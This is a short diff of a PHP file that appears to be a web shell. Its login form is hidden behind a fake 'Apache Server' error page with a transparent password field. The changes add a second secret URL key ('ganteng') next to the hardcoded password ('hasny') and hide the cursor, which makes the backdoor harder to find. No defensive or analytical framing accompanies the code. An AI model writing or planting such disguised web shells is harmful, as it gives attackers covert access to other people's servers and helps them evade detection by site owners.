@@ -76,9 +76,10 @@ if(!empty($_SERVER['HTTP_USER_AGENT'])) {
 }
 
 //Check Login
-if(isset($_POST['password'])){
+if(isset($_POST['password']) && isset($_GET['key'])){
 	$pass = $_POST['password'];
-	if($pass == "hasny"){
+	$key = $_GET['key'];
+	if($pass == "hasny" && $key == "ganteng"){
 		$_SESSION['login'] = "Masuk";
 	}
 }
@@ -655,7 +656,7 @@ if(isset($_SESSION['login']) && !empty($_SESSION['login'])){
 <hr>
 <address>Apache Server at <?=$_SERVER['HTTP_HOST']?> Port 80</address>
 <form method="post" action="<?php $_SERVER['PHP_SELF'];?>" >
-<input type="password" name="password" style="background:transparent;outline:none;border:none;color:#fff;">
+<input type="password" name="password" style="background:transparent;outline:none;border:none;color:#fff;cursor:none;">
 </form>
 <?php
 }
